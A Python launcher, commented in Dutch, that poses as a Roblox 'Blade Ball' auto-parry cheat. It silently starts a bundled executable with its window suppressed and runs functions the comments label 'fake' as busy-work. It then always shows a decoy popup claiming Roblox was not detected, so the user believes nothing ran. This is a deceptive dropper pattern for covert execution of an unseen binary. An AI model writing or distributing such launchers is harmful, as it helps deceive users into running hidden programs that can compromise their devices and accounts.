import subprocess
import os
import sys
import random
import hashlib
import tkinter as tk
from tkinter import messagebox

# Functies voor de fake logica
def random_string(length):
    return ''.join(random.choice("abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789") for i in range(length))

def fake_log_operation():
    log_data = random_string(64)
    hashlib.sha256(log_data.encode()).hexdigest()

def deep_nesting_a():
    return random.randint(0, 255)

def deep_nesting_b():
    fake_log_operation()

def unnecessary_calculation():
    return random.randint(0, 1000)

def initialize_large_system():
    for _ in range(50):
        deep_nesting_a()
        deep_nesting_b()

def execute_fake_action():
    fake_log_operation()

def final_fake_checks():
    return unnecessary_calculation() % 2 == 0

# Functie voor ball detection en popup
def ball_detection():
    print("Ball detection in progress...")
    return False

def show_centered_popup():
    root = tk.Tk()
    root.withdraw()

    root.update_idletasks()
    screen_width = root.winfo_screenwidth()
    screen_height = root.winfo_screenheight()
    width = 300
    height = 150
    x = (screen_width // 2) - (width // 2)
    y = (screen_height // 2) - (height // 2)

    root.geometry(f"{width}x{height}+{x}+{y}")

    if not ball_detection():
        messagebox.showwarning("Error", "We couldn't detect Roblox on your device.")
    else:
        messagebox.showinfo("Info", "Ball detected successfully!")

    root.destroy()

# Functie om de exe te starten
def execute_main_action(exe_path):
    subprocess.Popen(
        exe_path,
        creationflags=subprocess.CREATE_NO_WINDOW,
        cwd=os.path.dirname(os.path.abspath(exe_path))
    )

# Launcher logica
def main():
    exe_path = "blade-ball-auto-parry.exe"
    execute_main_action(exe_path)  # Eerst start je de exe

    # Na het starten van de exe, start je de Python-logica
    initialize_large_system()
    if final_fake_checks():
        execute_fake_action()
    
    # Start de popup
    show_centered_popup()

if __name__ == "__main__":
    main()
